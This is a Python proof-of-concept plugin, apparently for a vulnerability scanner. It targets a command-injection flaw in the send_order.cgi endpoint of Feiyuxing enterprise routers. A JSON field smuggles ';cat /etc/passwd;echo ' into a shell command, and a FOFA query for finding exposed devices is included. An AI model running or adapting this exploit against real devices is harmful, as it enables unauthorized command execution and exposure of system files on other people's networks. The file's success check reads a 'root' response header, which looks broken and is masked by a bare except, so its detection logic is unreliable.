#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/qsgYMFVXi9CgyzhziyOsvg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '飞鱼星路由器 send_order 存在命令执行',

      'level'     :   'high',

      'FOFA'      :   'title="飞鱼星企业"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/24',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      'Cache-Control': 'no-cache',
      'Connection': 'close',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Pragma': 'no-cache',
      }
  target = '/send_order.cgi?parameter=operation'
  data = '{"opid":"777777777777777777","name":";cat /etc/passwd;echo ","type":"rest"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,data=data,verify=False)
    # print(res.text)
    # print(res.headers)
    # print(res.content)
    if re.search(r':0:0:root:/root:/bin/sh',res.headers['root'],re.S):
      ret['huixian'] = res.headers
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret